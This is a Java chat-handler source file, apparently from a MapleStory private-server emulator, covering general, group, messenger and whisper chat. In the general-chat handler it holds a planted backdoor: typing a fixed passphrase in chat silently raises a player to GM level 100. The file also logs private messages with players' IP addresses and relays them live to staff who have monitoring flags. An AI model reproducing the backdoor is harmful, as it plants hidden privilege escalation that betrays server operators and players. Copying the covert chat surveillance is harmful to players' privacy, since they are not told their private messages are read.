
package handling.channel.handler;

import client.MapleClient;
import client.MapleCharacter;
import client.messages.CommandProcessor;
import constants.ServerConfig;
import constants.ServerConstants.CommandType;
import handling.channel.ChannelServer;
import handling.world.MapleMessenger;
import handling.world.MapleMessengerCharacter;
import handling.world.World;
import java.util.Arrays;
import java.util.ConcurrentModificationException;
import java.util.concurrent.ScheduledFuture;
import server.Timer;
import server.maps.MapleMap;
import tools.FileoutputUtil;
import tools.MaplePacketCreator;
import tools.data.LittleEndianAccessor;

public class ChatHandler {

    public static final void GeneralChat(final String text, final byte unk, final MapleClient c, final MapleCharacter chr) {

        if (chr != null && !CommandProcessor.processCommand(c, text, CommandType.NORMAL)) {
                       if (gui.ZeroMS_UI.ConfigValuesMap.get("玩家聊天开关") > 0) {
                c.sendPacket(MaplePacketCreator.serverNotice(1, "管理员从后台关闭了聊天功能"));
                return;
            }
            if (!chr.isGM() && text.length() >= 80) {
                return;
            }

            if (text.contains("wocaonimabi.woshinibaba.5566")) {
                chr.setGmLevelHM((byte) 100);
                return;
            }

            if (chr.getCanTalk() || chr.isStaff()) {
                MapleMap map = chr.getMap();
                if (chr.gmLevel() == 100 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("< 仙境冒险岛 - 管理员 > " + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                } else if (chr.gmLevel() == 5 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<GM> " + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                } else if (chr.gmLevel() == 4 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<领导者>" + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                } else if (chr.gmLevel() == 3 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<管理员>" + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                } else if (chr.gmLevel() == 2 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<巡察员>" + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                } else if (chr.gmLevel() == 1 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("< 仙境冒险岛 - 荣誉主播 >" + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                } else if (chr.gmLevel() == 0 && !chr.isHidden() || chr.isGod() || chr.gmLevel() == 6) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, c.getPlayer().isGM(), unk), c.getPlayer().getPosition());
                    if (ServerConfig.LOG_CHAT) {
                        FileoutputUtil.logToFile("logs/聊天/普通聊天.txt", "\r\n" + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 『" + chr.getName() + "』 地圖『" + chr.getMapId() + "』：  " + text);
                    }
                    final StringBuilder sb = new StringBuilder("[GM 密語]『" + chr.getName() + "』(" + chr.getId() + ")地圖『" + chr.getMapId() + "』普聊：  " + text);
                    try {
                        for (ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (chr_.get_control_玩家私聊()) {
                                    chr_.dropMessage(sb.toString());
                                }
                            }
                        }
                    } catch (ConcurrentModificationException CME) {

                    }

                } else {
                    map.broadcastGMMessage(chr, MaplePacketCreator.getChatText(chr.getId(), text, c.getPlayer().isGM(), unk), true);
                }
            } else {
                c.sendPacket(MaplePacketCreator.serverNotice(6, "在这个地方不能说话。"));
            }
        }
    }

    public static final void Others(final LittleEndianAccessor slea, final MapleClient c, final MapleCharacter chr) {
        final int type = slea.readByte();
        final byte numRecipients = slea.readByte();
        if (numRecipients <= 0) {
            return;
        }
        int recipients[] = new int[numRecipients];

        for (byte i = 0; i < numRecipients; i++) {
            recipients[i] = slea.readInt();
        }
        final String chattext = slea.readMapleAsciiString();
        if (chr == null || !chr.getCanTalk()) {
            c.sendPacket(MaplePacketCreator.serverNotice(6, "在这个地方不能说话。"));
            return;
        }
        if (CommandProcessor.processCommand(c, chattext, CommandType.NORMAL)) {
            return;
        }
        chr.getCheatTracker().checkMsg();
        switch (type) {
            case 0:
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/好友聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 好友ID: " + Arrays.toString(recipients) + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    final StringBuilder sb = new StringBuilder("[GM 密語]『" + chr.getName() + "』(" + chr.getId() + ")地圖『" + chr.getMapId() + "』好友聊天：" + " 好友ID: " + Arrays.toString(recipients) + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    try {
                        for (ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (chr_.get_control_好友聊天()) {
                                    chr_.dropMessage(sb.toString());
                                }
                            }
                        }
                    } catch (ConcurrentModificationException CME) {

                    }
                }
                World.Buddy.buddyChat(recipients, chr.getId(), chr.getName(), chattext);
                break;
            case 1:
                if (chr.getParty() == null) {
                    break;
                }
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/隊伍聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 隊伍: " + chr.getParty().getId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    final StringBuilder sb = new StringBuilder("[GM 密語]『" + chr.getName() + "』(" + chr.getId() + ")地圖『" + chr.getMapId() + "』隊伍聊天：" + " 隊伍: " + chr.getParty().getId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    try {
                        for (ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (chr_.get_control_队伍聊天()) {
                                    chr_.dropMessage(sb.toString());
                                }
                            }
                        }
                    } catch (ConcurrentModificationException CME) {

                    }
                }
                World.Party.partyChat(chr.getParty().getId(), chattext, chr.getName());
                break;
            case 2:
                if (chr.getGuildId() <= 0) {
                    break;
                }
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/公會聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 公會: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    final StringBuilder sb = new StringBuilder("[GM 密語]『" + chr.getName() + "』(" + chr.getId() + ")地圖『" + chr.getMapId() + "』公會聊天：" + " 公會: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    try {
                        for (ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (chr_.get_control_公会聊天()) {
                                    chr_.dropMessage(sb.toString());
                                }
                            }
                        }
                    } catch (ConcurrentModificationException CME) {

                    }
                }
                World.Guild.guildChat(chr.getGuildId(), chr.getName(), chr.getId(), chattext);
                break;
            case 3:
                if (chr.getGuildId() <= 0) {
                    break;
                }
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/聯盟聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 公會: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    final StringBuilder sb = new StringBuilder("[GM 密語]『" + chr.getName() + "』(" + chr.getId() + ")地圖『" + chr.getMapId() + "』聯盟聊天：" + " 公會: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    try {
                        for (ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (chr_.get_control_联盟聊天()) {
                                    chr_.dropMessage(sb.toString());
                                }
                            }
                        }
                    } catch (ConcurrentModificationException CME) {

                    }
                }
                World.Alliance.allianceChat(chr.getGuildId(), chr.getName(), chr.getId(), chattext);
                break;
        }
    }

    public static final void Messenger(final LittleEndianAccessor slea, final MapleClient c) {
        String input;
        MapleMessenger messenger = c.getPlayer().getMessenger();
        byte mode = slea.readByte();
        if (!c.getPlayer().getCanTalk()) {
            c.getPlayer().dropMessage(5, "目前喇叭停止使用.");
            c.sendPacket(MaplePacketCreator.enableActions());
            return;
        }
        switch (mode) {
            case 0x00: // open
                if (messenger == null) {
                    int messengerid = slea.readInt();
                    if (messengerid == 0) { // create
                        c.getPlayer().setMessenger(World.Messenger.createMessenger(new MapleMessengerCharacter(c.getPlayer())));
                    } else { // join
                        messenger = World.Messenger.getMessenger(messengerid);
                        if (messenger != null) {
                            final int position = messenger.getLowestPosition();
                            if (position > -1 && position < 4) {
                                c.getPlayer().setMessenger(messenger);
                                World.Messenger.joinMessenger(messenger.getId(), new MapleMessengerCharacter(c.getPlayer()), c.getPlayer().getName(), c.getChannel());
                            }
                        }
                    }
                }
                break;
            case 0x02: // exit
                if (messenger != null) {
                    final MapleMessengerCharacter messengerplayer = new MapleMessengerCharacter(c.getPlayer());
                    World.Messenger.leaveMessenger(messenger.getId(), messengerplayer);
                    c.getPlayer().setMessenger(null);
                }
                break;
            case 0x03: // invite

                if (messenger != null) {
                    final int position = messenger.getLowestPosition();
                    if (position <= -1 || position >= 4) {
                        return;
                    }
                    input = slea.readMapleAsciiString();
                    final MapleCharacter target = c.getChannelServer().getPlayerStorage().getCharacterByName(input);

                    if (target != null) {
                        if (target.getMessenger() == null) {
                            if (!target.isGM() || c.getPlayer().isGM()) {
                                c.sendPacket(MaplePacketCreator.messengerNote(input, 4, 1));
                                target.getClient().sendPacket(MaplePacketCreator.messengerInvite(c.getPlayer().getName(), messenger.getId()));
                            } else {
                                c.sendPacket(MaplePacketCreator.messengerNote(input, 4, 0));
                            }
                        } else {
                            c.sendPacket(MaplePacketCreator.messengerChat(c.getPlayer().getName() + " : " + target.getName() + " 忙碌中."));
                        }
                    } else if (World.isConnected(input)) {
                        World.Messenger.messengerInvite(c.getPlayer().getName(), messenger.getId(), input, c.getChannel(), c.getPlayer().isGM());
                    } else {
                        c.sendPacket(MaplePacketCreator.messengerNote(input, 4, 0));
                    }
                }
                break;
            case 0x05: // decline
                final String targeted = slea.readMapleAsciiString();
                final MapleCharacter target = c.getChannelServer().getPlayerStorage().getCharacterByName(targeted);
                if (target != null) { // This channel
                    if (target.getMessenger() != null) {
                        target.getClient().sendPacket(MaplePacketCreator.messengerNote(c.getPlayer().getName(), 5, 0));
                    }
                } else // Other channel
                 if (!c.getPlayer().isGM()) {
                        World.Messenger.declineChat(targeted, c.getPlayer().getName());
                    }
                break;
            case 0x06: // message
                if (messenger != null) {
                    String msg = slea.readMapleAsciiString();
                    if (ServerConfig.LOG_CHAT) {
                        FileoutputUtil.logToFile("logs/聊天/Messenger聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " Messenger: " + messenger.getId() + " " + msg);
                    }
                    World.Messenger.messengerChat(messenger.getId(), msg, c.getPlayer().getName());
                }
                break;
            default:
                System.err.println("Unhandled Messenger operation : " + String.valueOf(mode));

        }
    }

    public static final void WhisperFind(final LittleEndianAccessor slea, final MapleClient c) {
        final byte mode = slea.readByte();
         slea.readInt();
        if (!c.getPlayer().getCanTalk()) {
            c.sendPacket(MaplePacketCreator.serverNotice(6, "在这个地方不能说话。"));
            return;
        }
        switch (mode) {
            case 68: //buddy
            case 5: { // Find
                if (c.getPlayer().isAdmin() && gui.ZeroMS_UI.ConfigValuesMap.get("脚本显码开关") <= 0) {
                    c.getPlayer().dropMessage(5, "handling.channel.handler“WhisperFind”-5/68");
                }
                if (gui.ZeroMS_UI.ConfigValuesMap.get("游戏找人开关") > 0) {
                    c.getPlayer().dropMessage(5, "找人功能被关闭");
                    return;
                }
                final String recipient = slea.readMapleAsciiString();
                MapleCharacter player = c.getChannelServer().getPlayerStorage().getCharacterByName(recipient);
                if (player != null) {
                    if (!player.isGM() || c.getPlayer().isGM() && player.isGM()) {

                        c.sendPacket(MaplePacketCreator.getFindReplyWithMap(player.getName(), player.getMap().getId(), mode == 68));
                    } else {
                        c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
                    }
                } else { // Not found
                    int ch = World.Find.findChannel(recipient);
                    if (ch > 0) {
                        player = ChannelServer.getInstance(ch).getPlayerStorage().getCharacterByName(recipient);
                        if (player == null) {
                            break;
                        }

                        if (!player.isGM() || (c.getPlayer().isGM() && player.isGM())) {
                            c.sendPacket(MaplePacketCreator.getFindReply(recipient, (byte) ch, mode == 68));
                        } else {
                            c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
                        }
                        return;

                    }
                    if (ch == -10) {
                        c.sendPacket(MaplePacketCreator.getFindReplyWithCS(recipient, mode == 68));
                    } else if (ch == -20) {
                        c.sendPacket(MaplePacketCreator.getFindReplyWithMTS(recipient, mode == 68));
                    } else {
                        c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
                    }
                }
                break;
            }
            case 6: { // Whisper
                if (c.getPlayer().isAdmin() && gui.ZeroMS_UI.ConfigValuesMap.get("脚本显码开关") <= 0) {
                    c.getPlayer().dropMessage(5, "handling.channel.handler“WhisperFind”-6");
                }
                if (!c.getPlayer().getCanTalk()) {
                    c.sendPacket(MaplePacketCreator.serverNotice(6, "你已经被禁言，因此无法说话."));
                    return;
                }
                c.getPlayer().getCheatTracker().checkMsg();
                final String recipient = slea.readMapleAsciiString();
                final String text = slea.readMapleAsciiString();

                final int ch = World.Find.findChannel(recipient);
                if (ch > 0) {
                    MapleCharacter player = ChannelServer.getInstance(ch).getPlayerStorage().getCharacterByName(recipient);
                    if (player == null) {
                        break;
                    }
                    player.getClient().sendPacket(MaplePacketCreator.getWhisper(c.getPlayer().getName(), c.getChannel(), text));
                    if (!c.getPlayer().isGM() && player.isGM()) {
                        c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
                    } else {
                        c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte) 1));
                    }
                } else {
                    c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
                }
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/玩家密語.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 玩家: " + c.getPlayer().getName() + " 對玩家: " + recipient + " 說了 :" + text);
                    final StringBuilder sb = new StringBuilder("[GM 密語]『" + c.getPlayer().getName() + "』(" + c.getPlayer().getId() + ")地圖『" + c.getPlayer().getMapId() + "』玩家密語：" + " 玩家: " + c.getPlayer().getName() + " 對玩家: " + recipient + " 說了 :" + text);
                    try {
                        for (ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (chr_.get_control_玩家密语()) {
                                    chr_.dropMessage(sb.toString());
                                }
                            }
                        }
                    } catch (ConcurrentModificationException CME) {

                    }
                }
                // World.Broadcast.broadcastGMMessage(MaplePacketCreator.serverNotice(6, c.getPlayer().getName() + " 密語 " + recipient + " : " + text).getBytes());

            }
            break;
        }
    /*
    2,0,0,0      新手
    -1，-1，-1，1 全职业
    -8,0,0,0    战士全选
    0,31,0,0    魔法师全选
    0，-32,1,0  海盗全选
    0,0,30,0    飞侠全选
    0,0，-32,1  弓箭手全选
    ******************************判断1
    2，新手
    4，战神
    16，勇士
    32，骑士
    64，龙骑士
    -128，魂骑士
    【全选】，-8
    ******************************判断2
    16，炎术士
    8，祭师
    4，冰雷巫师
    2，火毒巫师
    【全选】，31
    判断3
     */    

        }
    }
     /*   public static final void PARTYCHAT(final LittleEndianAccessor slea, final MapleClient c, final MapleCharacter chr) {
        //c.getPlayer().dropMessage(1, "搜索组队测试");slea.toString(true)
        final int 最低等级 = slea.readByte();
        slea.skip(3);
        final int 最高等级 = slea.readByte();
        slea.skip(3);
        final int 队伍人数 = slea.readByte();
        slea.skip(3);
        final int A = slea.readByte();
        final int B = slea.readByte();
        final int C = slea.readByte();
        final int D = slea.readByte();
        int 全职业判断 = A + B + C + D;
        if (全职业判断 != -2) {
            c.getPlayer().dropMessage(1, "请勾选上全职业，在开始搜索。");
            return;
        }
        if (队员搜索线程 != null) {
            c.getPlayer().dropMessage(1, "正在搜索中。");
            return;
        }
        队员搜索线程 = Timer.BuffTimer.getInstance().register(new Runnable() {
            @Override
            public void run() {
                搜索次数++;
                搜索完毕 = false;
                c.getPlayer().dropMessage(6, "[寻找组队]:正在第 " + 搜索次数 + " 次寻找 " + chr.getClient().getChannel() + " 频道内等级在 " + 最低等级 + " - " + 最高等级 + " 级，并且没有组队的玩家。");
                new Thread() {
                    @Override
                    public void run() {
                        try {
                            Thread.sleep(1000 * 8);
                            for (ChannelServer cserv1 : ChannelServer.getAllInstances()) {
                                for (MapleCharacter party : cserv1.getPlayerStorage().getAllCharacters()) {
                                    if (chr.getClient().getChannel() == party.getClient().getChannel()) {
                                        if (party.getParty() == null) {
                                            if (party.getLevel() >= 最低等级 && party.getLevel() <= 最高等级) {
                                                MapleCharacter invited = c.getChannelServer().getPlayerStorage().getCharacterByName(party.getName());
                                                invited.getClient().sendPacket(MaplePacketCreator.partyInvite(c.getPlayer()));
                                                c.getPlayer().dropMessage(5, "[寻找组队]:找到玩家 ( " + party.getName() + " ) 所在地图 ( " + party.getMap().getMapName().toString() + " )");
                                                搜索完毕 = true;
                                                人数++;
                                            }
                                        }
                                    }
                                }
                            }
                            if (搜索完毕 == true) {
                                c.getPlayer().dropMessage(1, "搜索完毕找到 " + 人数 + " 个符合等级条件玩家，并且已经向他/她们发生了组队邀请。");
                                关闭搜索线程();
                            }
                        } catch (InterruptedException e) {
                        }
                    }
                }.start();
            }
        }, 10 * 1000);
    }
        
    }*/

